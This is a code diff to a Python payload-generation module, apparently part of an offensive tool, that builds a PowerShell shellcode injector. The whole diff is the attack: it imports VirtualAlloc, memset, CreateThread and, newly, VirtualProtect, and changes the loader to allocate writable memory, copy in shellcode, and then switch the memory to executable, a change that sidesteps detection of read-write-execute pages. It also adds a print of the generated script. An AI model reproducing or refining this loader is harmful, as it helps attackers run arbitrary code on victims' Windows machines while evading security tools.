@@ -72,11 +72,14 @@ class PayloadModule:
 [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
 [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
 [DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
+[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
 "@\n"""
             baseString += checks
             baseString += """$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
-$x=$o::VirtualAlloc(0,0x1000,0x3000,0x40); [Byte[]]$sc = %s;
+$x=$o::VirtualAlloc(0,0x1000,0x3000,0x04); [Byte[]]$sc = %s;
 for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
+$oldprotect = 0;
+$here=$o::VirtualProtect($x, [UInt32]0x1000, [UInt32]0x20, [Ref]$oldprotect);
 $z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
 
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
@@ -94,7 +97,7 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($ct.ToInt32()+$i), $s
 $z=$o::CreateThread(0,0,$ct,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
 
         baseString += '}\n' * num_ends
-
+        print(baseString)
         return baseString
 
     def generate(self):
